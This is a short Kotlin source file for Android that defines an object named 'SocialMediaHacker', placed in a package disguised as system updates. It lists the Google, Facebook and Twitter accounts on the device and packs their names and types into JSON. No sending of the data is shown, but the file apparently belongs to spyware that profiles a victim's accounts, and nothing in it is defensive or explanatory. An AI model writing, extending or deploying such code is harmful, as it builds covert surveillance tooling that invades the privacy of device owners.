package com.system.updates.modules

import android.accounts.AccountManager
import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object SocialMediaHacker {
    fun dumpAccounts(context: Context): String {
        val accountManager = AccountManager.get(context)
        val accountTypes = listOf("com.google", "com.facebook.auth.login", "com.twitter.android.auth.login")
        val result = JSONObject()
        accountTypes.forEach { type ->
            val accounts = accountManager.getAccountsByType(type)
            val accountsArray = JSONArray()
            accounts.forEach { account ->
                val accObj = JSONObject()
                accObj.put("name", account.name)
                accObj.put("type", account.type)
                accountsArray.put(accObj)
            }
            result.put(type, accountsArray)
        }
        return result.toString()
    }
}